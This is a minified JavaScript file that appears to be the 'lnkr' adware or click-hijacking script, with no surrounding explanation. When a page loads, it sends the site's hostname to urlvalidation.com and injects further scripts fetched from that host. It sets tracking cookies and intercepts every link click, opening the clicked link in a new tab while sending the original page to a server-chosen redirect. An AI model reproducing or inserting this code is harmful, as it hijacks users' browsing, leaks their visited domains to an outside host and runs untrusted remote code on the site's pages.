(function(s){var d="urlvalidation.com";var o=(location.protocol=="https:"?"https:":"http:")+"//urlvalidation.com/filter-domains";var f=(location.protocol=="https:"?"https:":"http:")+"//urlvalidation.com/api/js-get?sourceId=30";var q="";var u=100;var z=[];var H=Boolean(document.attachEvent);var p=false;var A=false;var y=null;var r=true;var m=null;var c=null;var D=null;var E="__lnkrntafu";var j="__lnkrntdmcvrd";var w="__lnntlk";var F=G(document.location.hostname);s._lnkr_nt_active=true;s._lnkr30=s._lnkr30||{};if(_lnkr30.excludeDomains){for(var C in _lnkr30.excludeDomains){z.push(_lnkr30.excludeDomains[C])}}if(_lnkr30.uid){q=_lnkr30.uid}if(typeof _lnkr30.host!="undefined"){m=(_lnkr30.host)}if(q){f+="&uid="+encodeURIComponent(q)}function x(I,L,N,K,M){var J="";M=M||"/";if(N){var i=new Date();i.setTime(i.getTime()+(N*1000));J+="; expires="+i.toGMTString()}if(K){J+=";domain="+K}document.cookie=I+"="+L+J+"; path="+M}function b(J){var L=J+"=";var I=document.cookie.split(";");for(var K=0;K<I.length;K++){var M=I[K];while(M.charAt(0)==" "){M=M.substring(1,M.length)}if(M.indexOf(L)==0){return M.substring(L.length,M.length)}}return null}function n(i){return(i+"").replace(/([.?*+^$[\]\\(){}|-])/g,"\\$1")}function a(i){return i.replace(/^\s+|\s+$/g,"")}function k(I,i){return Math.floor(Math.random()*(i-I+1))+I}function G(i){return i.toLowerCase().replace(/^www\./,"").replace(/:.*$/,"")}function h(i){if(H){i=i||s.event}if("which" in i&&3==i.which||"button" in i&&2==i.button){return}if(!l(i)){if(H){i.returnValue=false}else{i.preventDefault()}}}function l(I){var K=(H)?"srcElement":"target";var N,M=I[K];do{try{N=M.nodeType}catch(L){break}if(1===N&&(O=M.tagName.toUpperCase(),"A"===O||"AREA"===O)){var P=I.ctrlKey||I.metaKey||I.altKey||I.shiftKey,J=I.which&&1===I.which||0===I.button,O=M;if(!(O&&!P&&J)){return true}if(O.getAttribute("lnkr_redirecting")){return true}var i=O.getAttribute("href");if(!i||i=="#"){return true}if(D){(function(T){var R=T.href;if(typeof s.stop=="function"){s.stop()}if(typeof I.stopImmediatePropagation=="function"){I.stopImmediatePropagation()}else{if(typeof I.stopPropagation=="function"){I.stopPropagation()}}var Q=document.createElement("a");Q.href=R;Q.target="_blank";Q.setAttribute("lnkr_redirecting",true);Q.__norewrite=true;document.body.appendChild(Q);Q.click();document.body.removeChild(Q);x(w,1,86400,(c?"."+c:null));x(E,"",0);var S=D;D=null;setTimeout(function(){location.href=S},0);location.href=S})(O);return false}else{}return true}M=M.parentNode}while(M);return true}function v(J){var I=document.getElementsByTagName("head")[0]||document.documentElement;var i=document.createElement("script");i.type="text/javascript";i.async=true;i.src=J;I.insertBefore(i,I.firstChild)}function t(){if(typeof z!=="undefined"&&z!=""&&z.length){for(var K=0;K<z.length;K++){if(z[K]==""){continue}var J=new RegExp(n(a(z[K])));if(location.hostname.match(J)){return false}}}var M=k(1,93435);if(b(w)==1){return true}var L=b(j);var I=b(E);if(L==-1){return true}if(I==-1){return true}if(I){D=I;c=L;return true}if(L){B(L);return true}s["func"+M]=(function(){return function(i){if(i.length>0){try{c=i[0];x(j,c,864000,"."+c);B(c)}catch(O){}}else{x(j,"-1",864000)}}})();var N=o+"?stub="+M+"&domains="+G(location.hostname);v(N)}function B(i){if(i){g("http://"+i)}}function g(i){var I=k(1,93435);s["func"+I]=(function(){return function(K){if(K!=i){D=K;x(E,K,86400)}else{x(E,"-1",3600)}}})();var J=f+"&stub="+I;if(A&&m){J+="&host="+m}J+="&out="+encodeURIComponent(i);v(J)}var e=function(){if(document.attachEvent){document.attachEvent("onclick",h)}else{if(document.addEventListener){document.addEventListener("click",h,false)}}};if(typeof u!=="undefined"&&u<100){if(k(1,99)>=u){return}}e();t()})(window);